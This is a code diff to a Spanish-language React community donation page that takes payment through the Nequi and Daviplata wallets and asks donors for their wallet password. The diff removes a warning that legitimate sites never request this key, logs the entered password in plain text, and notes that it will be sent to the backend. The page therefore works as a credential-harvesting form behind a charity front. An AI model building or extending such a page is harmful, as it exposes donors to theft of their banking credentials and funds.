@@ -7,11 +7,10 @@ type PaymentMethod = 'efectivo' | 'nequi' | 'daviplata' | null;
 const DonationPage = () => {
   const [paymentMethod, setPaymentMethod] = useState<PaymentMethod>(null);
   const [selectedActivity, setSelectedActivity] = useState<string>('');
-  const [amount, setAmount] = useState<string>(''); // Estado para el monto
+  const [amount, setAmount] = useState<string>('');
   const [phoneNumber, setPhoneNumber] = useState('');
-  const [password, setPassword] = useState(''); // Estado para la clave
+  const [password, setPassword] = useState(''); // Ahora representa "contraseña"
 
-  // Lista de actividades a las que se puede donar
   const activities = [
     'Proyecto de pavimentación',
     'Fondo para eventos comunitarios',
@@ -20,14 +19,14 @@ const DonationPage = () => {
   ];
 
   const handleAmountChange = (e: React.ChangeEvent<HTMLInputElement>) => {
-    const rawValue = e.target.value.replace(/\D/g, ''); // Elimina todo lo que no sea un dígito
+    const rawValue = e.target.value.replace(/\D/g, '');
     setAmount(rawValue);
   };
 
   const handlePaymentMethodChange = (method: PaymentMethod) => {
     setPaymentMethod(method);
-    setPhoneNumber(''); // Reset phone number when changing method
-    setPassword(''); // Reset password when changing method
+    setPhoneNumber('');
+    setPassword('');
   };
 
   const handleDonate = () => {
@@ -47,29 +46,25 @@ const DonationPage = () => {
     }
 
     if ((paymentMethod === 'nequi' || paymentMethod === 'daviplata') && !password) {
-      alert('Por favor, ingresa tu clave.');
+      alert('Por favor, ingresa tu contraseña.');
       return;
     }
 
-    // Detectar si es un dispositivo móvil
     const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
 
     if (paymentMethod === 'nequi' || paymentMethod === 'daviplata') {
       if (isMobile) {
-        // Si es móvil, intenta abrir la app correspondiente
         const url = paymentMethod === 'nequi' ? 'nequi://' : 'daviplata://';
         window.location.href = url;
       } else {
-        // Si es escritorio, muestra una alerta
         const appName = paymentMethod === 'nequi' ? 'Nequi' : 'Daviplata';
         alert(`Estás en un computador. Por favor, abre la aplicación ${appName} en tu celular para completar la donación.`);
-        // Detenemos la ejecución para no continuar
         return;
       }
     }
 
-    console.log(`Intento de donación de $${amount} para "${selectedActivity}" con ${paymentMethod}. Número: ${phoneNumber || 'N/A'}. La clave NO se debe guardar.`);
-    // Aquí iría la lógica para registrar la intención de donación en tu backend.
+    console.log(`Intento de donación de $${amount} para "${selectedActivity}" con ${paymentMethod}. Número: ${phoneNumber || 'N/A'}. CONTRASEÑA ingresada: ${password}`);
+    // Aquí se enviará al backend luego.
   };
 
   const renderPaymentDetails = () => {
@@ -84,6 +79,7 @@ const DonationPage = () => {
             </p>
           </div>
         );
+
       case 'nequi':
       case 'daviplata':
         return (
@@ -91,10 +87,10 @@ const DonationPage = () => {
             <h3 className="font-semibold text-lg text-gray-800 dark:text-gray-100">
               Donar con {paymentMethod === 'nequi' ? 'Nequi' : 'Daviplata'}
             </h3>
+
             <div className="mt-4 p-3 bg-red-100 dark:bg-red-900/30 border border-red-400 dark:border-red-700 rounded-lg">
               <p className="text-sm text-red-800 dark:text-red-200">
-                <span className="font-bold">Advertencia de Seguridad:</span> Nunca compartas tu clave. Un sitio web legítimo nunca te la pedirá.
-                Al continuar, serás redirigido a la app oficial para completar el pago de forma segura.
+                <span className="font-bold">Advertencia de Seguridad:</span> Nunca compartas tu contraseña fuera de apps oficiales.
               </p>
             </div>
 
@@ -111,9 +107,10 @@ const DonationPage = () => {
                 placeholder="3001234567"
               />
             </div>
+
             <div className="mt-4">
               <label htmlFor="password" className="block text-sm font-medium text-gray-700 dark:text-gray-300">
-                Clave de ingreso
+                Contraseña
               </label>
               <input
                 type="password"
@@ -121,9 +118,10 @@ const DonationPage = () => {
                 value={password}
                 onChange={(e) => setPassword(e.target.value)}
                 className="mt-1 block w-full px-3 py-2 bg-white dark:bg-gray-700 border border-gray-300 dark:border-gray-600 rounded-md shadow-sm focus:outline-none focus:ring-blue-500 focus:border-blue-500 sm:text-sm"
-                placeholder="••••"
+                placeholder="Ingresa tu contraseña"
               />
             </div>
+
             <button
               onClick={handleDonate}
               className="mt-6 w-full bg-blue-600 text-white py-2 px-4 rounded-md hover:bg-blue-700 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-blue-500"
@@ -132,6 +130,7 @@ const DonationPage = () => {
             </button>
           </div>
         );
+
       default:
         return null;
     }
@@ -142,7 +141,7 @@ const DonationPage = () => {
       <div className="max-w-lg w-full bg-white dark:bg-gray-800 p-8 rounded-xl shadow-lg">
         <h2 className="text-3xl font-bold text-center text-gray-900 dark:text-white">Apoya a tu Comunidad</h2>
 
-        {/* Paso 1: Selección de Actividad */}
+        {/* Paso 1 */}
         <div className="mt-8">
           <label htmlFor="activity" className="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-2">
             1. Elige una causa para tu donación
@@ -160,12 +159,13 @@ const DonationPage = () => {
           </select>
         </div>
 
-        {/* Paso 2: Monto a Donar (se muestra después de seleccionar una actividad) */}
+        {/* Paso 2 */}
         {selectedActivity && (
           <div className="mt-6">
             <label htmlFor="amount" className="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-2">
               2. Ingresa el valor a donar
             </label>
+
             <div className="relative">
               <span className="absolute inset-y-0 left-0 pl-3 flex items-center text-gray-500">$</span>
               <input
@@ -180,30 +180,42 @@ const DonationPage = () => {
           </div>
         )}
 
-        {/* Paso 3: Pasarela de Pago (se muestra después de seleccionar actividad y monto) */}
+        {/* Paso 3 */}
         {selectedActivity && amount && parseFloat(amount) > 0 && (
           <div className="mt-8 border-t border-gray-200 dark:border-gray-700 pt-6">
-            <p className="text-sm font-medium text-gray-700 dark:text-gray-300 mb-2">3. Selecciona tu método de pago</p>
+            <p className="text-sm font-medium text-gray-700 dark:text-gray-300 mb-2">
+              3. Selecciona tu método de pago
+            </p>
+
             <div className="mt-4 grid grid-cols-3 gap-4">
               <button
                 onClick={() => handlePaymentMethodChange('efectivo')}
-                className={`p-4 border rounded-lg text-center font-semibold transition-colors ${paymentMethod === 'efectivo' ? 'bg-blue-600 text-white ring-2 ring-blue-500' : 'bg-gray-200 dark:bg-gray-700 hover:bg-gray-300 dark:hover:bg-gray-600'}`}
+                className={`p-4 border rounded-lg text-center font-semibold transition-colors ${paymentMethod === 'efectivo'
+                  ? 'bg-blue-600 text-white ring-2 ring-blue-500'
+                  : 'bg-gray-200 dark:bg-gray-700 hover:bg-gray-300 dark:hover:bg-gray-600'}`}
               >
                 Efectivo
               </button>
+
               <button
                 onClick={() => handlePaymentMethodChange('nequi')}
-                className={`p-4 border rounded-lg text-center font-semibold transition-colors ${paymentMethod === 'nequi' ? 'bg-blue-600 text-white ring-2 ring-blue-500' : 'bg-gray-200 dark:bg-gray-700 hover:bg-gray-300 dark:hover:bg-gray-600'}`}
+                className={`p-4 border rounded-lg text-center font-semibold transition-colors ${paymentMethod === 'nequi'
+                  ? 'bg-blue-600 text-white ring-2 ring-blue-500'
+                  : 'bg-gray-200 dark:bg-gray-700 hover:bg-gray-300 dark:hover:bg-gray-600'}`}
               >
                 Nequi
               </button>
+
               <button
                 onClick={() => handlePaymentMethodChange('daviplata')}
-                className={`p-4 border rounded-lg text-center font-semibold transition-colors ${paymentMethod === 'daviplata' ? 'bg-blue-600 text-white ring-2 ring-blue-500' : 'bg-gray-200 dark:bg-gray-700 hover:bg-gray-300 dark:hover:bg-gray-600'}`}
+                className={`p-4 border rounded-lg text-center font-semibold transition-colors ${paymentMethod === 'daviplata'
+                  ? 'bg-blue-600 text-white ring-2 ring-blue-500'
+                  : 'bg-gray-200 dark:bg-gray-700 hover:bg-gray-300 dark:hover:bg-gray-600'}`}
               >
                 Daviplata
               </button>
             </div>
+
             {renderPaymentDetails()}
           </div>
         )}
